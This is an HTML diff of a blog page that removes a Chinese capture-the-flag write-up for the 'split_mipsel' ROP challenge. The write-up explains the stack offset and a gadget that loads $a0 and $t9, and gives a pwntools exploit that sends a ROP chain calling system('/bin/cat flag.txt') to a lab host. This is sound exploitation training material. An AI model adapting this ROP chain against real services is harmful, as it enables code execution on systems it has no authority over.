-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/split_mipsel/" class="post-title-link" itemprop="url">split_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:11:51" itemprop="dateCreated datePublished" datetime="2023-03-15T10:11:51+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:03:10" itemprop="dateModified" datetime="2023-04-03T13:03:10+08:00">2023-04-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这道题目的本质是如何让ROP去执行system，同时将命令&#x2F;bin&#x2F;cat flag.txt的地址传递给system函数。<br>漏洞的溢出点还是非常简单，缓冲区位于：sp+18h，ra中的函数返回地址保存在：sp + 3ch，填充24h个数据后，开始覆盖掉返回地址。<br>那么需要找个一个gadget可以控制a0寄存器，随后可以执行到system函数，非常巧的是，在该题目ELF中塞入了一个这样的gadget：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A20                               usefulGadgets:</span><br><span class="line">.text:00400A20 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:00400A24 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400A28 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400A2C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
-<p>此时的问题就是如何控制命令地址和system函数的地址分别到sp+8和sp+4上。<br>当控制流被劫持的时候，此时sp已经完成了堆栈平衡，此时的sp相对溢出缓冲区起始地址的距离是40h-18h&#x3D;28h，那么可以将命令地址和system函数地址布置到sp+8和sp+4，也就是相对溢出缓冲区28h+8和28h+4的位置，小结如下：</p>
-<p>相对溢出缓冲区的布局：</p>
-<ul>
-<li>24h后的4个字节&#x3D;gadget位置，写完了28h个字节</li>
-<li>28h+4&#x3D;2ch后的4个字节&#x3D;system函数地址，写完了30h个字节</li>
-<li>28h+8&#x3D;30h后的4个字节&#x3D;&#x2F;bin&#x2F;cat&#x2F; flag.txt的地址<br>中间无用的数据使用任意字节填充，得到ROP如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00400A20</span>) <span class="comment"># gadget</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span></span><br><span class="line">rop += p32(<span class="number">0x004110CC</span>)</span><br><span class="line">rop += p32(<span class="number">0x00411010</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./split_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00400A20</span>)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span></span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">rop += p32(<span class="number">0x00411010</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;raw&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(rop)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<p>#qu gdb运行到分支、运行到函数返回</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1220,7 +1247,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
